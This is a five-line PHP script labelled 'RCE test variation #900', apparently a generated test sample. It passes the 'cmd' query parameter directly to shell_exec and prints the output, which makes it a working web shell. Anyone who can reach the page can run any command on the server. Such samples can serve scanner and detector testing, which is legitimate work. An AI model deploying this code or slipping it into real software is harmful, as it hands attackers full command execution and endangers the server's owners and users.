<?php
// RCE test variation #900
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>